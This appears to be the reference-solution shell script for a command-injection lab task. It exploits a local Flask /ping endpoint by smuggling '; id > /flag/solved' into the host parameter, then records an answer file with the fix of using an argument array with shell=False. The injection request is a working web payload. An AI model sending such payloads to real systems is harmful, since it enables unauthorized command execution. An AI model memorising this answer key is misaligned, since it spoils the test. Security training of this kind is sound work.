# Reference solution for command-injection. Runs as root inside the container.
#
# /ping builds  ping -c 1 <host>  and runs it in a shell. Appending  ; id > /flag/solved
# to the host value makes the shell run a second command that writes id's output
# (uid=...) into the flag file - proving OS command execution as the web process.
set -euo pipefail

APP="http://127.0.0.1:8080"

# Wait for the Flask app to come up.
for _ in $(seq 1 40); do
  curl -sf -o /dev/null "$APP/" && break
  sleep 0.5
done

# Exploit: chain a command onto the ping with ';' and capture its output into the flag.
curl -s -G "$APP/ping" --data-urlencode "host=127.0.0.1; id > /flag/solved" >/dev/null
sleep 1

# Record the findings.
cat > /root/answers.txt <<'EOF'
OPERATOR=;
IMPACT=OS
FIX=never build a shell string - use an argument array (subprocess.run(["ping","-c","1",host]), shell=False)
EOF
